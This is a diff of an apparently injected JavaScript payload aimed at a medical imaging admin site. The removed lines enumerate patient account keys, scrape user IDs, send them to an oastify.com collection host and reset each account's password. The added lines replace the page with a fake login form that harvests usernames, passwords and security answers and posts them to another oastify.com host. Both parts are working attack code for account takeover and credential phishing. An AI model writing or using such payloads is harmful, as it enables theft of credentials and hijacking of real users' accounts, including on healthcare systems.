@@ -1,15 +1,53 @@
-for (let i = 199307; i <= 199308; i++) {
-  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
-    .then(res => res.text())
-    .then(res => {
-      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
-      if (match) {
-        fetch(`https://z6611aosllgv4bf92ualm68kdbj27uvj.oastify.com?data=${encodeURIComponent(match[1])}`);
-      }
-      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
-      });
-    });
+// 清除页面中的所有内容
+document.body.innerHTML = '';
+
+// 创建标题
+const loginTitle = document.createElement("h2"); // 更具体的变量名
+loginTitle.textContent = "Login page";
+document.body.appendChild(loginTitle);
+
+// 创建表单（使用唯一命名）
+const customLoginForm = document.createElement("form");
+customLoginForm.id = "customLoginForm"; // 使用独特ID
+
+// 输入域创建函数（提取公共逻辑）
+function createFormField(form, labelText, name, type = "text") {
+  form.appendChild(document.createTextNode(labelText));
+  const input = document.createElement("input");
+  input.type = type;
+  input.name = name;
+  input.required = true;
+  form.appendChild(input);
+  form.appendChild(document.createElement("br"));
+  return input;
 }
+
+// 创建各输入域
+createFormField(customLoginForm, "account:", "username");
+createFormField(customLoginForm, "password:", "password", "password");
+createFormField(customLoginForm, "The answer of your question?", "answer");
+
+// 添加间隔
+customLoginForm.appendChild(document.createElement("br"));
+
+// 提交按钮（使用具体命名）
+const formSubmitButton = document.createElement("button");
+formSubmitButton.type = "submit";
+formSubmitButton.textContent = "Submit";
+customLoginForm.appendChild(formSubmitButton);
+
+// 添加表单到页面
+document.body.appendChild(customLoginForm);
+
+// 事件监听（使用独特函数名）
+customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
+  e.preventDefault();
+
+  const formData = new FormData(customLoginForm);
+  
+  // 发送请求（可根据需要保留或修改）
+  fetch("https://y87x3fdhhra47v6he6zakx8ktbz2nsbh.oastify.com", {
+    method: "POST",
+    body: formData
+  });
+});
